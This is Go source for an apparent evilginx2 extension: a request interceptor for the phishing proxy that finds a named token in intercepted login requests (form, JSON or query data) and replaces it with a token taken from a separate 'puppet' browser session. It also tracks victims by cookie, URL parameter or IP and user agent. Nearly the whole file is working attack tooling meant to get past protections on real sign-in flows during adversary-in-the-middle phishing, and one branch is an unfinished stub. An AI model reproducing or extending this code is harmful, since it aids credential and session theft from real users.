package core

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// RequestInterceptor intercepts and modifies HTTP requests
type RequestInterceptor struct {
	puppetMaster *PuppetMaster
	triggers     []*PuppetTrigger
}

// NewRequestInterceptor creates a new interceptor
func NewRequestInterceptor(pm *PuppetMaster) *RequestInterceptor {
	return &RequestInterceptor{
		puppetMaster: pm,
	}
}

// AddTrigger adds a trigger for interception
func (ri *RequestInterceptor) AddTrigger(trigger *PuppetTrigger) {
	ri.triggers = append(ri.triggers, trigger)
}

// InterceptRequest intercepts and modifies an HTTP request
func (ri *RequestInterceptor) InterceptRequest(req *http.Request, sessionID string) (*http.Request, bool) {
	// Check if any trigger matches this request
	for _, trigger := range ri.triggers {
		if ri.matchesTrigger(req, trigger) {
			log.Debug("[INTERCEPTOR] Request matches trigger for token: %s", trigger.Token)
			
			// Try to get existing token first (fast path)
			puppetToken, exists := ri.puppetMaster.GetToken(sessionID, trigger.Token)
			
			if !exists {
				// Token doesn't exist yet, wait for puppet to complete
				log.Info("[INTERCEPTOR] Token not available, waiting for puppet session...")
				token, err := ri.puppetMaster.WaitForToken(sessionID, trigger.Token, 30*time.Second)
				if err != nil {
					log.Warning("[INTERCEPTOR] Failed to wait for puppet token: %v", err)
					return req, false
				}
				puppetToken = token
			}
			
			// Extract original token from request
			originalToken, err := ri.extractTokenFromRequest(req, trigger.Token)
			if err != nil {
				log.Warning("[INTERCEPTOR] Failed to extract token: %v", err)
				return req, false
			}
			
			log.Info("[INTERCEPTOR] Replacing token %s... with %s...", 
				shortenToken(originalToken), 
				shortenToken(puppetToken))
			
			// Replace token in request
			modifiedReq, err := ri.replaceTokenInRequest(req, originalToken, puppetToken)
			if err != nil {
				log.Error("[INTERCEPTOR] Failed to replace token: %v", err)
				return req, false
			}
			
			// If trigger has abort, we need to handle differently
			if trigger.AbortOriginal {
				// In practice, you'd return a modified request and signal to abort original
				// This depends on how Evilginx handles request modification
				log.Debug("[INTERCEPTOR] Trigger configured to abort original request")
			}
			
			log.Success("[INTERCEPTOR] Token successfully injected into request")
			return modifiedReq, true
		}
	}
	
	return req, false
}

// matchesTrigger checks if request matches a trigger
func (ri *RequestInterceptor) matchesTrigger(req *http.Request, trigger *PuppetTrigger) bool {
	// Check domain
	host := req.Host
	if host == "" {
		host = req.URL.Host
	}
	
	domainMatch := false
	for _, domain := range trigger.Domains {
		if strings.Contains(host, domain) || domain == "*" {
			domainMatch = true
			break
		}
	}
	
	if !domainMatch {
		return false
	}
	
	// Check path
	pathMatch := false
	path := req.URL.Path
	for _, triggerPath := range trigger.Paths {
		if path == triggerPath || triggerPath == "*" {
			pathMatch = true
			break
		}
		// Support regex paths
		if strings.HasPrefix(triggerPath, "regex:") {
			pattern := strings.TrimPrefix(triggerPath, "regex:")
			if matched, _ := regexp.MatchString(pattern, path); matched {
				pathMatch = true
				break
			}
		}
	}
	
	return domainMatch && pathMatch
}

// extractTokenFromRequest extracts token from request body
func (ri *RequestInterceptor) extractTokenFromRequest(req *http.Request, tokenName string) (string, error) {
	// Read body
	bodyBytes, err := io.ReadAll(req.Body)
	if err != nil {
		return "", err
	}
	
	// Restore body for future reads
	req.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))
	bodyStr := string(bodyBytes)
	
	// Try different extraction methods
	
	// Method 1: Form-encoded
	values, err := url.ParseQuery(bodyStr)
	if err == nil {
		for key, val := range values {
			if strings.Contains(strings.ToLower(key), strings.ToLower(tokenName)) && len(val) > 0 {
				return val[0], nil
			}
		}
	}
	
	// Method 2: JSON encoded
	if strings.Contains(bodyStr, "{") && strings.Contains(bodyStr, "}") {
		// Simple JSON extraction (for production, use proper JSON parser)
		pattern := fmt.Sprintf(`"%s"\s*:\s*"([^"]+)"`, regexp.QuoteMeta(tokenName))
		re := regexp.MustCompile(pattern)
		matches := re.FindStringSubmatch(bodyStr)
		if len(matches) > 1 {
			return matches[1], nil
		}
		
		// Try without quotes
		pattern2 := fmt.Sprintf(`%s["']?\s*[:=]\s*["']?([^"',}&]+)`, regexp.QuoteMeta(tokenName))
		re2 := regexp.MustCompile(pattern2)
		matches2 := re2.FindStringSubmatch(bodyStr)
		if len(matches2) > 1 {
			return matches2[1], nil
		}
	}
	
	// Method 3: URL parameters
	queryValues := req.URL.Query()
	for key, val := range queryValues {
		if strings.Contains(strings.ToLower(key), strings.ToLower(tokenName)) && len(val) > 0 {
			return val[0], nil
		}
	}
	
	return "", fmt.Errorf("token %s not found in request", tokenName)
}

// replaceTokenInRequest replaces token in request body
func (ri *RequestInterceptor) replaceTokenInRequest(req *http.Request, oldToken, newToken string) (*http.Request, error) {
	// Read original body
	bodyBytes, err := io.ReadAll(req.Body)
	if err != nil {
		return nil, err
	}
	
	bodyStr := string(bodyBytes)
	
	// Replace token
	// Handle URL-encoded
	bodyStr = strings.ReplaceAll(bodyStr, url.QueryEscape(oldToken), url.QueryEscape(newToken))
	// Handle raw
	bodyStr = strings.ReplaceAll(bodyStr, oldToken, newToken)
	
	// Create new request with modified body
	newReq := req.Clone(req.Context())
	newReq.Body = io.NopCloser(bytes.NewBufferString(bodyStr))
	newReq.ContentLength = int64(len(bodyStr))
	
	// Update Content-Length header
	newReq.Header.Set("Content-Length", fmt.Sprintf("%d", len(bodyStr)))
	
	return newReq, nil
}

// ExtractSessionID extracts session ID from request/cookies
func (ri *RequestInterceptor) ExtractSessionID(req *http.Request) string {
	// Try to get session ID from cookie
	cookie, err := req.Cookie("evilginx_session")
	if err == nil {
		return cookie.Value
	}
	
	// Try from URL parameter
	sessionID := req.URL.Query().Get("session")
	if sessionID != "" {
		return sessionID
	}
	
	// Generate from IP + User-Agent as fallback
	ip := req.RemoteAddr
	ua := req.UserAgent()
	return fmt.Sprintf("%s_%s", ip, ua)
}